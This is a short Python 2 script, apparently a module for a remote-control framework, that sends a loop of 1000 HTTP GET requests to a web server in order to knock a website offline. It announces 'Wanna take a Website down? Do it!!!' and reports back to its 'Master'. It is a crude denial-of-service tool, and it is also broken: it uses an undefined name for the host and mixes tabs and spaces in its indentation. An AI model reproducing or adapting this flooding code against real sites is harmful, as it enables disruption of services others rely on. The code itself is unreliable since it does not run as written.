import os
import socket
import sys

def iwannakill():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((localhost, 80)) 
        s.send("GET /" + "apache" + " HTTP/1.1\r\n")
        s.send("Host: " + "localhost"  + "\r\n\r\n");
        s.close()

def run(**args):
	print "[*] Wanna take a Website down? Do it!!!"
	for i in range(1, 1000):
		iwannakill()
	return "Master we tried killing the enemy..."
